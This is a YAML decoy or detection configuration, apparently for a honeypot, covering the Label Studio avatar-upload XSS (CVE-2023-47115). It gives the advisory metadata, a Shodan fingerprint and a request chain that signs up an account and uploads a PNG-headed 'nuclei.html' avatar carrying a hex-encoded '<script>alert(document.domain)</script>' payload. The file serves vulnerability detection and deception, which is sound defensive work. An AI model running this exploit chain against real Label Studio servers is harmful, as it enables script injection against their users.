id: CVE-2023-47115
info:
  name: Label Studio - Cross-Site Scripting
  author: isacaya
  description: 'Versions prior to 1.9.2 have a cross-site scripting (XSS) vulnerability
    that could be exploited when an authenticated user uploads a crafted image file
    for their avatar that gets rendered as a HTML file on the website.

    '
  severity: high
  impact: 'Executing arbitrary JavaScript could result in an attacker performing malicious
    actions on Label Studio users if they visit the crafted avatar image.

    '
  remediation: 'Update to version 1.9.2.

    '
  reference:
  - https://github.com/advisories/GHSA-q68h-xwq5-mm7x
  - https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development
  - https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49
  - https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26
  - https://nvd.nist.gov/vuln/detail/CVE-2023-47115
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
    cvss-score: 7.1
    cve-id: CVE-2023-47115
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 6
    shodan-query: http.favicon.hash:-1649949475
  tags: cve,cve2023,xss,authenticated,intrusive,label-studio
traps:
- request:
    method: GET
    path: /user/login/
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <script>alert(document.domain)</script>
- request:
    method: POST
    path: /user/signup/?&next=/projects/
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'csrfmiddlewaretoken={{csrftoken}}&email={{randstr_1}}%40{{randstr_1}}.{{randstr_1}}&password={{randstr_2}}&allow_newsletters=false

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /api/current-user/whoami
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/users//avatar/
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytZZRQ9D2LS0PMsHF
    body: |
      ------WebKitFormBoundarytZZRQ9D2LS0PMsHF
      Content-Disposition: form-data; name="avatar"; filename="nuclei.html"
      Content-Type: image/png

      {{hex_decode("89504E470D0A1A0A0000000D4948445200000009000000080802000000A4AF42E200000046494441543C7363726970743E616C65727428646F63756D656E742E646F6D61696E293C2F7363726970743E")}}
      ------WebKitFormBoundarytZZRQ9D2LS0PMsHF
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /api/current-user/whoami
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: ''
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
